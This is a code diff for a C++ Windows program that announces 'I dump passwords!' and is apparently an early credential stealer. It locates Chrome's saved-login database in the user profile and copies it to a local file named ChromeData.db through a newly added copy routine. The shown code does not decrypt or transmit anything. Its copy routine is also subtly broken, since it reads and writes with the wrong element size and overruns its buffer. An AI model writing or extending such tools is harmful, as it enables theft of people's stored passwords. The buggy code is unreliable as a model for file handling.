@@ -5,6 +5,40 @@
 #include <userenv.h>
 #include <string>
 
+void CopyFiles(char * dst, char * src){
+     //GetFileSize
+    DWORD fileSize;
+    char* buffer;
+    fflush(stdin);
+    FILE * infile = fopen(src, "r");
+    if (infile == NULL){
+        printf("file failed to open");
+        printf("ERROR: %d", GetLastError());
+    }
+    int size;
+    
+    fseek(infile, 0L, SEEK_END);
+    size = ftell(infile);
+    fseek(infile, 0L, SEEK_SET);
+
+    printf("SIZE: %d\n", size);
+
+    buffer = (char *)malloc(size);
+
+    fread(buffer,sizeof(char *), size, infile );
+    fclose(infile);
+    //for (int i = 0; i < size; i++){
+      //  printf("%c", buffer[i]);
+    //}
+    FILE * outfile = fopen(dst, "w+");
+    if (outfile == NULL){
+        printf("file failed to open");
+        printf("ERROR: %d", GetLastError());
+    }
+    fwrite(buffer, sizeof(char *), size, outfile );
+    fclose(outfile);
+    free(buffer);
+}
 
 int main(){
     printf("I dump passwords!\n");
@@ -16,13 +50,14 @@ int main(){
         printf("didnt get path\n");
         return -1;
     }
-
-    //printf("%s: \n",lpProfileDir);
-
-
-    std::string db_path = std::string(lpProfileDir) + std::string("AppData/Local/Google/Chrome/User Data/default/Login Data");
+    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data");
+    printf("%s\n", const_cast<char*>(db_path.c_str()));
     //copy the file contents to a new file
-    STARTUPINFOA si;
-    HANDLE fh = CreateFile(outfile, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE| FILE_SHARE_READ, sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //not sure about share mode param
+    std::string temp = "ChromeData.db";
+    //std::string a = "a.txt";
+    //std::string b = "b.txt";
+    //CopyFiles(const_cast<char*>(b.c_str()), const_cast<char*>(a.c_str()));
+    CopyFiles(const_cast<char*>(temp.c_str()), const_cast<char*>(db_path.c_str()));
+   //C:\Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default"
     
 }
